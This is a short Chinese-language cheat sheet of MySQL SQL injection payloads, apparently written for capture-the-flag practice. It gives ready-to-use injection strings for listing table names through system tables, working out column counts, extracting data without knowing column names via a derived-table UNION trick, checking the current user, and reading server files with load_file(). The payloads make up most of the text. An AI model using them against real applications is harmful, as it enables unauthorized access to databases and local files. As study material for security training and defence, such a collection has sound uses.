# 其他获取数据库里信息的方法

## 使用 `sys.schema_table_statistics_with_buffer` 查表名
```sql
SELECT table_name FROM sys.schema_table_statistics_with_buffer WHERE table_schema = database();
```

## 使用 `mysql.innodb_table_stats` 查表名
```sql
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()#
```

## 构造表查表的列数
假设原始的查询如下：
```SQL
SELECT title FROM posts WHERE id = '[USER_INPUT]';
```
假设目标表 `flag` 具有两个列，但不知道列名，也不知道列数。

使用如下 payload：
```SQL
1' AND (SELECT 1 FROM (SELECT * FROM secret_flag UNION SELECT 1) AS t limit 1) #
```

```SQL
1' AND (SELECT 1 FROM (SELECT * FROM secret_flag UNION SELECT 1,2) AS t limit 1) #
```

就可以试出列数

## 无列名注入（构造表查列的数据）
这在无法得知列的真实名称时很有用。
假设原始的查询如下：
```SQL
SELECT title FROM posts WHERE id = '[USER_INPUT]';
```
假设目标表 `flag` 具有两个列，但不知道列名。

使用如下 payload：
```sql
-1' UNION SELECT (SELECT `2` FROM (SELECT 1, 2 UNION SELECT * FROM secret_flag) AS a LIMIT 1, 1) #
```
该 payload 构造了一个虚拟表 `AS a`，这个虚拟表中 `SELECT 1, 2` 将作为列名，后面 `UNION SELECT` 的数据将拼接在 `1, 2` 的下面，由此获得一个虚拟表：

| 1     | 2            |
| ----- | ------------ |
| admin | flag{114514} |
外层的 `SELECT 2` 就可以获得信息，然后由更外层的 `UNION SELECT` 回显

## 查询当前用户的权限
```sql
union select user()#
```

## 读取本地文件
```sql
union select load_file("path")#
```
